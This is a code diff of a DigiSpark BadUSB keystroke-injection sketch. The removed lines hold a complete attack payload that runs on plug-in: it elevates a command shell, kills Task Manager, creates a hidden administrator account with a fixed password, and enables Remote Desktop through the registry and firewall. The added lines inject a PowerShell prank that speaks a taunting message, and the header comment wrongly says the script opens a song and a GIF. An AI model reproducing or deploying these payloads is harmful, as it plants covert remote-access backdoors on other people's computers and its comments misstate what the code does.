@@ -1,46 +1,31 @@
+//This DigiSpark script opens up Mounir's song Ana ray2 and also a GIF and then maximizes it using F11
 #include "DigiKeyboard.h"
-#define KEY_TAB 0x2b
 void setup() {
-  pinMode(1, OUTPUT); //LED on Model A 
+  //empty
 }
-
 void loop() {
-   
-  DigiKeyboard.update();
-  DigiKeyboard.sendKeyStroke(0);
-  DigiKeyboard.delay(3000);
- 
-  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //run
-  DigiKeyboard.delay(200);
-  DigiKeyboard.println("taskmgr"); //starting taskmgr
-  DigiKeyboard.delay(500);
-  DigiKeyboard.sendKeyStroke(KEY_F, MOD_ALT_LEFT); 
-  DigiKeyboard.sendKeyStroke(KEY_N);//run
-  DigiKeyboard.delay(500);
-  DigiKeyboard.print("cmd /k mode con: cols=15 lines=1");//start cmd
-  DigiKeyboard.sendKeyStroke(KEY_TAB); 
-  DigiKeyboard.sendKeyStroke(KEY_SPACE);//turn on admin privileges
-  DigiKeyboard.sendKeyStroke(KEY_ENTER); //run
-  DigiKeyboard.delay(200);
-  DigiKeyboard.println("taskkill /IM \"taskmgr.exe\" /F ");//killing taskmanager
-  DigiKeyboard.delay(500);  
-  DigiKeyboard.println("net user blanka Ping@123 /ADD");//adding user
-  DigiKeyboard.delay(500);
-  DigiKeyboard.println("net localgroup Administrators blanka /ADD");//adding user to admin group
-  DigiKeyboard.delay(500);
-  DigiKeyboard.println(F("reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\" /v blanka /t REG_DWORD /d 0 /f"));//Hiding user from login screen
-  DigiKeyboard.delay(500);
-  DigiKeyboard.println(F("reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f"));//Turning Remote desktop
-  DigiKeyboard.delay(500);
-  DigiKeyboard.println(F("netsh advfirewall firewall set rule group=\"remote desktop\" new enable=yes"));//Allowing remote desktop through firewall
-  DigiKeyboard.delay(500);
-  DigiKeyboard.println("net localgroup \"Remote Desktop Users\" blanka /add");//adding created user to remote desktop group
-  DigiKeyboard.delay(500);  
-  DigiKeyboard.println("exit");//adding created user to remote desktop group
-  DigiKeyboard.delay(500);
-  digitalWrite(1, HIGH); //turn on led when program finishes
-  DigiKeyboard.delay(90000);
-  digitalWrite(1, LOW); 
-  DigiKeyboard.delay(5000);
-  
+  /*calling the sendKeyStroke() function with 0 starts the script, it cancels the effect of 
+  all keys that are already being pressed at the time of execution to avoid conflicts*/
+   DigiKeyboard.sendKeyStroke(0);
+   // waits 10th of a second (100 ms) before sending any other key strokes
+   DigiKeyboard.delay(100);
+   // presses <WINDOWS> + R to open run.exe and waits another half second for it to start
+   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+   DigiKeyboard.delay(500);
+   // writes "powershell" in the textbox of run.exe and presses ENTER to open it
+   DigiKeyboard.print("powershell");
+   DigiKeyboard.sendKeyStroke(KEY_ENTER);
+   DigiKeyboard.delay(3000);
+   DigiKeyboard.print("Add-Type -AssemblyName System.speech"); 
+   DigiKeyboard.sendKeyStroke(KEY_ENTER);
+   DigiKeyboard.delay(200);
+   DigiKeyboard.print("$speak = New-Object System.Speech.Synthesis.SpeechSynthesizer");
+   DigiKeyboard.sendKeyStroke(KEY_ENTER);
+   DigiKeyboard.delay(100);
+   DigiKeyboard.print("$speak.Speak(\"Hi there, I know you think something is wrong with the universe since I am talking but do not worry I just got bored of how many mistakes you make.\")");
+   DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  //this payload works once cuz of this line
+  for(;;){
+  //empty
+  }
 }
